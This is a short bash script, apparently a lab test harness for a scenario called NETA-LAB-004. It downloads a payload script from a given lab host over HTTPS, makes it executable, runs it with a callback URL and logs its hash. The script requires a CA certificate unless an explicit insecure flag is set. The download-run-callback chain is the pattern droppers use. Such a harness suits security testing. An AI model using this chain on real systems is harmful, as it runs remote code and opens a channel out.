#!/usr/bin/env bash
set -euo pipefail

HOST="${1:?usage: run.sh <lab-host> [port] [ca-cert]}"
PORT="${2:-18444}"
CA_CERT="${3:-${NETA_LAB_CA_CERT:-}}"
RUN_ID="linux-$(date -u +%Y%m%dT%H%M%SZ)-$$"
TMP="$(mktemp -d -t neta-lab-004-XXXXXX)"
PAYLOAD="$TMP/neta-lab-004-payload"
PAYLOAD_URL="https://${HOST}:${PORT}/payload/neta-lab-004-payload.sh"
CALLBACK_URL="https://${HOST}:${PORT}/callback"

cleanup() { rm -rf "$TMP"; }
trap cleanup EXIT INT TERM

curl_tls=(--fail --silent --show-error --retry 2 --connect-timeout 5)
if [[ -n "$CA_CERT" ]]; then
  [[ -r "$CA_CERT" ]] || { echo "CA certificate is not readable: $CA_CERT" >&2; exit 2; }
  curl_tls+=(--cacert "$CA_CERT")
elif [[ "${NETA_LAB_TLS_INSECURE:-0}" == "1" ]]; then
  curl_tls+=(--insecure)
else
  echo "NETA-LAB-004 requires a CA certificate (argument 3 or NETA_LAB_CA_CERT)." >&2
  echo "For an explicitly isolated ad-hoc lab only, NETA_LAB_TLS_INSECURE=1 may be used." >&2
  exit 2
fi

command -v curl >/dev/null
command -v sha256sum >/dev/null

curl "${curl_tls[@]}" -H "X-NETA-Lab-Run: $RUN_ID" -o "$PAYLOAD" "$PAYLOAD_URL"
chmod 0700 "$PAYLOAD"
PAYLOAD_SHA256="$(sha256sum "$PAYLOAD" | awk '{print $1}')"

printf 'scenario=NETA-LAB-004\nrun_id=%s\ndownload_url=%s\npayload_path=%s\npayload_sha256=%s\n' \
  "$RUN_ID" "$PAYLOAD_URL" "$PAYLOAD" "$PAYLOAD_SHA256"

"$PAYLOAD" "$CALLBACK_URL" "$RUN_ID" "$CA_CERT"

echo "NETA-LAB-004 Linux chain complete"
